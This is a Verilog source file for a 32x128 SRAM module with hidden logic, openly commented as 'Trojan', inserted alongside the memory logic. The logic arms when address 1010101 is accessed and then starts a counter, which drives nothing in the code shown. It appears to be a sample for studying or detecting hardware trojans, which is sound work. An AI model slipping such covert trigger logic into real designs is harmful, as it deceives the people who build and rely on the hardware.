`timescale 1ns/1ps

module SRAM_32x128_1rw (
  clk0,
  csb0,
  web0,
  addr0,
  din0,
  dout0
);

  parameter DATA_WIDTH = 32;
  parameter ADDR_WIDTH = 7;
  parameter RAM_DEPTH  = 1 << ADDR_WIDTH;
  parameter DELAY      = 3;

  input                   clk0;  
  input                   csb0;  
  input                   web0;  
  input  [ADDR_WIDTH-1:0] addr0;
  input  [DATA_WIDTH-1:0] din0;
  output reg [DATA_WIDTH-1:0] dout0;

  reg                  csb0_reg;
  reg                  web0_reg;
  reg [ADDR_WIDTH-1:0] addr0_reg;
  reg [DATA_WIDTH-1:0] din0_reg;

  reg [DATA_WIDTH-1:0] mem [0:RAM_DEPTH-1];

  // Trojan: Counter declaration
  reg [7:0] counter = 8'b0;
  // Trojan: Trigger flag 
  reg trigger = 1'b0;

  always @(posedge clk0) begin
    csb0_reg  <= csb0;
    web0_reg  <= web0;
    addr0_reg <= addr0;
    din0_reg  <= din0;
  end

  always @(negedge clk0) begin : MEM_WRITE0
    if (!csb0_reg && !web0_reg)
      mem[addr0_reg] <= din0_reg;
  end

  always @(negedge clk0) begin : MEM_READ0
    if (!csb0_reg && web0_reg)
      dout0 <= #(DELAY) mem[addr0_reg];
  end

  // Trojan: Counter logic
  always @(posedge clk0) begin
    // Trojan: Trigger condition
    if (addr0 == 7'b1010101) begin
      trigger <= 1'b1;
    end 
    
    // Trojan: Increment counter if triggered
    if (trigger) begin
      counter <= counter + 1;
    end
  end
endmodule